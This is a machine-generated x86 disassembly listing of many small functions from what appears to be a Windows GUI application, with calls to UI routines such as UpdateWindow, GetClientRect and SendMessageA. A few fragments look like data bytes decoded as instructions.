mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_4446ae
jmp sub_4038c0
sub_444700
push ebx
mov ebx eax
call sub_421060
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_440d98
pop ebx
retn
sub_44471c
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_440d98
retn
sub_444730
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_440d98
retn
sub_444740
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_440d98
retn
sub_4449ec
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_446760
pop esi
retn
sub_444b00
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_444bd4
pop esi
retn
sub_444b28
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_444b3c
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_444cb3
jmp sub_4038c0
sub_444cba
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_444d4a
jmp sub_4038c0
sub_444d51
pop ebx
pop ecx
pop ebp
retn
sub_444d58
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_444d68
retn
sub_444d6c
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_444d8c
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_444eec
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_444fbc
retn
sub_4450d4
jmp sub_4038c0
sub_4450db
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4451a6
jmp sub_4038c0
sub_4451d0
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_445262
jmp sub_4038c0
sub_445434
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_4456d8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_4457b4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_44315c
pop esi
retn
sub_445878
push esi
mov si 0xffc1
call sub_403368
pop esi
retn
sub_4458a4
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4458b8
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4458cc
call sub_44311c
retn
sub_4458d4
call sub_44311c
retn
sub_4458dc
call sub_44311c
retn
sub_445984
push ebx
mov ebx eax
mov eax ebx
call sub_4417b4
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_4221f8
mov dx 0xb009
mov eax ebx
call sub_44315c
pop ebx
retn
sub_445ae8
call sub_44311c
retn
sub_445af0
call sub_44311c
retn
sub_445af8
call sub_44311c
retn
sub_445b00
call sub_44311c
retn
sub_445b64
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_445ffa
jmp sub_4038c0
sub_446001
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4460e0
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_446284
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_440d98
retn
sub_446324
push ebx
mov ebx eax
mov eax ebx
call sub_446754
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_446340
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_446518
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_446450
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_446570
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_440d98
sub_446590
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_440d98
sub_4465b4
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_4465c0
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_440d98
sub_44666c
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_446610
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_446748
jmp sub_4038c0
sub_44674f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44696e
jmp sub_4038c0
sub_446975
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_446a38
call sub_440b68
retn
sub_446e86
jmp sub_4038c0
sub_446f1c
mov eax [ r-xdata ]
retn
sub_447083
jmp sub_4038c0
sub_447194
cmp dl [ eax + 0x165 ]
je r-xdata
retn
mov [ eax + 0x165 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_440d98
sub_4471b4
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_440d98
sub_4474ca
jmp sub_4038c0
sub_44760c
test [ eax + 0x52 ] 0x4
setne al
retn
sub_447768
jmp sub_4038c0
sub_44776f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_4228c4
retn
sub_44778b
jmp sub_4038c0
sub_447798
retn
sub_44786c
mov [ edx + 0xc ] 0xffffffff
retn
sub_4478ca
jmp sub_4038c0
sub_4478d1
pop ecx
pop ecx
pop ebp
retn
sub_447971
jmp sub_4038c0
sub_447978
pop ebx
mov esp ebp
pop ebp
retn
sub_4479e4
call sub_443924
retn
sub_447a77
jmp sub_4038c0
sub_447a7e
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_447c5d
jmp sub_4038c0
sub_447c64
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447dc0
push ebx
mov ebx eax
mov eax ebx
call sub_44cb20
or edx 0xffffffff
mov eax ebx
call sub_447eec
pop ebx
retn
sub_447e98
jmp sub_4038c0
sub_447eec
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_447dd8
sub_44805c
push ebx
mov ebx eax
mov eax ebx
call sub_44cbd8
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_448074
push ebx
mov ebx eax
mov eax ebx
call sub_44cbd8
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_448160
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_44455c
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_4481fb
jmp sub_4038c0
sub_448202
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448225
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4228c4
retn
sub_44821e
jmp sub_4038c0
sub_448225
pop ebx
pop ecx
pop ebp
retn
sub_44822c
retn
sub_448294
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_448601
jmp sub_4038c0
sub_4487e8
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_4489d4
jmp sub_4038c0
sub_448a84
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_448a98
inc [ eax + 0x6c ]
retn
sub_448a9c
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_44a31c
sub_448bfc
call sub_4492fc
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_4495a7
jmp sub_4038c0
sub_4495ae
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4495cb
lea eax [ ebp - 0xc ]
call sub_403f40
retn
sub_4495c4
jmp sub_4038c0
sub_4495cb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4498ac
jmp sub_4038c0
sub_4498b3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4498d0
mov eax [ ebp - 0x4 ]
call sub_4228c4
retn
sub_4498c9
jmp sub_4038c0
sub_4498d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4498ed
mov eax [ ebp - 0x4 ]
call sub_40316c
retn
sub_4498e6
jmp sub_4038c0
sub_4498ed
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_449da1
jmp sub_4038c0
sub_449da8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_449f33
jmp sub_4038c0
sub_449f3a
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_449fef
jmp sub_4038c0
sub_449ff6
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44a0e4
jmp sub_4038c0
sub_44a135
jmp sub_4038c0
sub_44a13c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44a1f8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_448b08
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_44a344
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_448644
sub_44aa94
sub_44aaff
add [ ebp + 0x558df04d ] cl
hlt
sub_44ac44
jmp sub_4038c0
sub_44ac4b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44ad14
call GetCapture
retn
sub_44ad1c
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40ceec
pop ebx
retn
sub_44ad2c
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_44af92
jmp sub_4038c0
sub_44b18c
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_44b1a0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push edx
push eax
call [ rw-data ]
retn
sub_44b1b8
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push edx
push eax
call [ rw-data ]
retn
sub_44b1d0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push edx
push eax
call [ rw-data ]
retn
sub_44b1e8
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_44b3fc
jmp sub_4038c0
sub_44b403
pop ebx
mov esp ebp
pop ebp
retn
sub_44b44e
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
pop ebx
retn
sub_44b4cb
jmp sub_4038c0
sub_44b4d2
pop ebp
retn
sub_44b55a
jmp sub_4038c0
sub_44b561
pop ebp
retn
sub_44b902
inc ecx
add [ eax + esi * 8 + 0x41 ] bh
add [ eax + esi * 8 - 0xf7fffbf ] ch
inc ecx
add [ esp + edi * 4 ] bl
inc esp
add [ esp + eax * 8 + 0x44 ] cl
add ah ah
retn
sub_44ba8c
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_417ef0
retn
sub_44baa4
mov al 0x1
retn
sub_44baa8
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_41eb08
retn
mov eax edx
retn
sub_44bab8
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_41ead8
retn
mov al 0x1
retn
sub_44bda8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_417e94
pop esi
pop ebx
retn
sub_44bdbc
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_44bdf8
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_44bfbc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032f8
pop ebx
retn
sub_44bfd0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032f8
pop ebx
retn
sub_44bfe4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032f8
pop ebx
retn
sub_44bff8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032f8
pop ebx
retn
sub_44c00c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032f8
pop ebx
retn
sub_44c020
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032f8
pop ebx
retn
sub_44c034
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032f8
pop ebx
retn
sub_44c048
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032f8
pop ebx
retn
sub_44c05c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032f8
pop ebx
retn
sub_44c070
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032f8
pop ebx
retn
sub_44c084
retn
sub_44c088
retn
sub_44c08c
retn
sub_44c090
retn
sub_44c094
retn
sub_44c098
retn
sub_44c09c
retn
sub_44c0a0
retn
sub_44c0a4
retn
sub_44c0a8
retn
sub_44c0ac
retn
sub_44c0b0
retn
sub_44c35c
jmp sub_4038c0
sub_44c6f8
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebx + 0x90 ] eax
sub_44c720
push esi
mov si 0xffef
call sub_403368
pop esi
retn
sub_44c7c1
jmp sub_4038c0
sub_44c7c8
pop ebp
retn
sub_44c7cc
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41771c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41771c
sub_44c9f4
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_44cbcd
jmp sub_4038c0
sub_44cbd4
pop ebx
pop ecx
pop ebp
retn
sub_44cbd8
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_44cbe0
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_44ce48
sub_44cc8d
jmp sub_4038c0
sub_44cc94
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_40316c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_44cd9c
test edx edx
je r-xdata
mov eax [ eax + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
retn
mov eax edx
retn
sub_44cedb
jmp sub_4038c0
sub_44cee2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44cf7a
jmp sub_4038c0
sub_44cf81
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cf9e
mov eax [ ebp - 0xc ]
call sub_40316c
retn
sub_44cf97
jmp sub_4038c0
sub_44cf9e
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403368
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44d075
jmp sub_4038c0
sub_44d0b3
jmp sub_4038c0
sub_44d0ba
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403368
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44d27f
jmp sub_4038c0
sub_44d286
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d2a3
mov eax [ ebp - 0xc ]
call sub_40316c
retn
sub_44d29c
jmp sub_4038c0
sub_44d2a3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44d31c
retn
sub_44d2bc
jmp sub_4038c0
sub_44d30b
jmp sub_4038c0
sub_44d312
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44d39b
jmp sub_4038c0
sub_44d3a2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44d3a8
or edx 0xffffffff
call sub_44d31c
retn
sub_44d7b7
jmp sub_4038c0
sub_44d7be
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d7db
mov eax [ ebp - 0xc ]
call sub_40316c
retn
sub_44d7d4
jmp sub_4038c0
sub_44d7db
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d7f8
mov eax [ ebp - 0x4 ]
call sub_44e2f0
retn
sub_44d7f1
jmp sub_4038c0
sub_44d7f8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44d9fc
jmp sub_4038c0
sub_44da03
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44da08
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_403368
sub_44da20
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_416a38
pop ebx
retn
sub_44dac4
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_417d38
sub_44dbdb
jmp sub_4038c0
sub_44dbe2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_40316c
retn
sub_44dbf8
jmp sub_4038c0
sub_44df0a
jmp sub_4038c0
sub_44df11
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44df2e
mov eax [ ebp - 0x10 ]
call sub_40316c
retn
sub_44df27
jmp sub_4038c0
sub_44df2e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44df4b
mov eax [ ebp - 0x8 ]
call sub_40316c
retn
sub_44df44
jmp sub_4038c0
sub_44df4b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44dfb4
jmp sub_4038c0
sub_44e0cd
jmp sub_4038c0
sub_44e0ea
jmp sub_4038c0
sub_44e2a2
jmp sub_4038c0
sub_44e2a9
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44e2ec
inc [ eax + 0x5c ]
retn
sub_44e2f0
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_403368
sub_44e344
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_44e381
jmp sub_4038c0
sub_44e388
pop ebp
retn
sub_44e38c
sub [ rw-data ] 0x1
retn
sub_44f297
jmp [ eax + eax ]
sub_44f2f4
mov eax [ esp + 0x8 ]
retn
sub_44f2fc
push ebx
mov ebx eax
call sub_44f2f4
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
jmp sub_4038f8
sub_44f318
pop ebx
retn
sub_44f591
jmp sub_4038c0
sub_44f598
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44f6e3
jmp sub_4038c0
sub_44f6ea
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44f700
push ebx
mov eax [ rw-data ]
call sub_418404
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_4183c0
mov eax ebx
pop ebx
retn
sub_44f888
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_44f8a4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40331c
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_44ff9f
jmp sub_4038c0
sub_44ffa6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45009e
jmp sub_4038c0
sub_4500a5
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4504c8
jmp sub_4038c0
sub_4504cf
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_45097b
jmp sub_4038c0
sub_450e1c
jmp sub_4038c0
sub_450e23
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_451287
jmp sub_4038c0
sub_451744
jmp sub_4038c0
sub_45174b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_451af6
jmp sub_4038c0
sub_451afd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_451b0b
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_451cb8
mov eax [ r-xdata ]
retn
sub_451cf4
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_451d08
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_451d18
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_451d28
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_452024
mov edx eax
sub_451dc0
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
mov edx esi
call sub_451d40
pop esi
pop ebx
retn
sub_451e3c
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_452024
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_417ef0
mov ecx eax
sub_452214
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_45227c
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_452624
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_452658
sub_452658
mov edx sub_452630
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_44f780
retn
sub_452842
jmp sub_4038c0
sub_452849
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_452ce0
jmp sub_4038c0
sub_452d1f
jmp sub_4038c0
sub_452d26
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_452ec4
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_453000
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_403368
pop esi
pop ebp
retn 0x8
sub_45301c
mov eax [ eax + 0x34 ]
call sub_450254
retn
sub_453028
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_403368
pop esi
retn
sub_453064
push ebx
mov ecx sub_45303c
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_44f780
pop ebx
retn
sub_453298
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_4532ac
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
sub_4533e1
jmp sub_40360c
sub_4534e3
jmp sub_4038c0
sub_45350e
jmp sub_4038c0
sub_453515
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_45352c
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_453714
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_453064
sub_453794
jmp sub_4038c0
sub_4537d8
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_4537f0
push ebx
mov ebx eax
mov eax ebx
call sub_41eb28
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_453842
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_453064
sub_4538b8
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_453a01
jmp sub_4038c0
sub_453a08
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_453c48
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_453c58
sub_453cac
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_453cbc
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_453ccc
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_453cdc
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_453cec
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_453d64
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_4500ac
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_4500ac
retn
sub_453d80
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_4500ac
